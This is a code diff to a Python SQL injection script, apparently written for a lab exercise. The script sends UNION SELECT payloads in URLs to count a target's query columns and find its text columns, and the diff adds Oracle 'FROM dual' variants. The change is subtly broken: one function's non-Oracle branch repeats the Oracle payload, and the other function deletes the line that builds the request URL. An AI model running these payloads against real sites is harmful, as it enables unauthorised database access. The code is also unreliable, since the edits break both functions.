@@ -36,13 +36,16 @@ def normalize_url(url):
         url = url + "/"
     return url
 
-def determine_number_of_columns(url, no_proxy):
+def determine_number_of_columns(url, no_proxy, oracle=False):
     log.info("Determining number of columns")
     nulls_list=["NULL"]
     num_columns = None
     while len(nulls_list) < 10:
         nulls = ",".join(nulls_list)
-        category = f"' UNION SELECT {nulls}-- "
+        if oracle:
+            category = f"' UNION SELECT {nulls} FROM dual-- "
+        else:
+            category = f"' UNION SELECT {nulls} FROM dual-- "
         exploit_url = url + category
         if no_proxy: 
             resp = requests.get(exploit_url)
@@ -57,14 +60,16 @@ def determine_number_of_columns(url, no_proxy):
     return num_columns
 
 
-def determine_text_columns(url, no_proxy, num_columns):
+def determine_text_columns(url, no_proxy, num_columns, oracle=False):
     text_columns = []
     for i in range(0, num_columns):
         nulls_list = ["NULL"] * num_columns
         nulls_list[i] = "'a'"
         nulls = ",".join(nulls_list)
-        category = f"' UNION SELECT {nulls}-- "
-        exploit_url = url + category 
+        if oracle:
+            category = f"' UNION SELECT {nulls} FROM dual-- "
+        else:
+            category = f"' UNION SELECT {nulls}-- "
         if no_proxy: 
             resp = requests.get(exploit_url)
         else: 
